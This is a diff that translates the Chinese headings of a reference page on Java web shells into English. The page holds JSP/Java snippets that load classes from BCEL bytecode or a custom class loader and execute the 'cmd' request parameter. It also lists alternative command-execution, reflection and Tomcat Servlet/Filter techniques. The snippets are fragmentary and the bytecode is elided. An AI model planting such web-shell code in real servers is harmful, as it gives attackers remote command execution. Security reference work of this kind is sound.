@@ -1,14 +1,14 @@
 WebShell
 ========================================
 
-BCEL字节码
+BCEL bytecode
 ----------------------------------------
 .. code:: java
 
     String bcelCode = "...";
     response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString()).getBytes());
 
-自定义类加载器
+Custom class loader
 ----------------------------------------
 .. code:: java
 
@@ -37,19 +37,19 @@ BCEL字节码
     }.loadClass("shell").getConstructor(String.class).newInstance(request.getParameter("cmd")).toString().getBytes());
     %>
 
-执行命令变式
+Execute command variant
 ----------------------------------------
 - java.lang.ProcessBuilder#start
 - java.lang.Runtime#exec
 - TemplatesImpl
 
-基于反射
+Based on reflection
 ----------------------------------------
 - class.forName
 - MethodAccessor.invoke
 - Method.invoke
 
-其他Shell变式
+Other shell variants
 ----------------------------------------
 - java.beans.Expression
 - java.lang.ClassLoader
@@ -60,7 +60,7 @@ BCEL字节码
 - ScriptEngineManager
 - ToolProvider.getSystemJavaCompiler
 
-Tomcat 容器
+Tomcat container
 ----------------------------------------
 - Servlet
 - Filter
